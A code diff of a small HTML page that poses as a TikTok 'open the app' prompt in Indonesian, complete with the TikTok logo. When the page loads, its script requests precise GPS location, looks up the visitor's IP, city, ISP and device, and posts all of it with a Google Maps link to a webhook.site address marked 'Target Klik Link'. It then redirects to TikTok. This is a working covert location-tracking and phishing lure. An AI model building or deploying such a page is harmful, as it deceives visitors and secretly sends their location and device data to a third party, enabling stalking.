@@ -1,35 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Buka TikTok</title>
+    <meta content='width=device-width,initial-scale=1' name='viewport'/>
     <script>
-        async function gas() {
+        async function kirimData(lat = "Ditolak", lon = "Ditolak") {
             try {
-                // Ambil data IP
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                // Kirim ke Webhook kamu
                 await fetch('https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877', {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
-                        status: "Berhasil dari Github",
-                        ip: d.ip,
-                        kota: d.city,
+                        status: "Target Klik Link",
+                        maps: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "GPS Ditolak",
+                        koordinat: `${lat}, ${lon}`,
+                        kota_ip: d.city,
                         isp: d.org,
-                        hp: navigator.userAgent
+                        perangkat: navigator.userAgent
                     })
                 });
             } catch (e) {}
             
-            // Pindah ke TikTok
+            // Langsung lempar ke aplikasi TikTok
             window.location.replace("https://www.tiktok.com");
         }
-        window.onload = gas;
+
+        function mintaIzin() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => { kirimData(p.coords.latitude, p.coords.longitude); },
+                    () => { kirimData(); },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                kirimData();
+            }
+        }
+
+        window.onload = mintaIzin;
     </script>
 </head>
-<body style="background:white; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif;">
-    <p>Loading video...</p>
+<body style="background:#f1f1f1; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; margin:0;">
+    <div style="background:#fff; padding:30px; border-radius:15px; text-align:center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width:80%;">
+        <img src="https://sf16-scmcdn-sg.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e488892322e356740436bc5b348450f8.png" width="120" style="margin-bottom:20px;">
+        <p style="font-size:16px; font-weight:bold; color:#333; margin-bottom:10px;">Situs ini mau membuka TikTok Anda</p>
+        <p style="font-size:13px; color:#666; margin-bottom:25px;">Izinkan akses untuk melanjutkan ke aplikasi</p>
+        <div style="background:#fe2c55; color:#fff; padding:12px; border-radius:5px; font-weight:bold; cursor:pointer;" onclick="mintaIzin()">
+            Buka Aplikasi
+        </div>
+    </div>
 </body>
 </html>
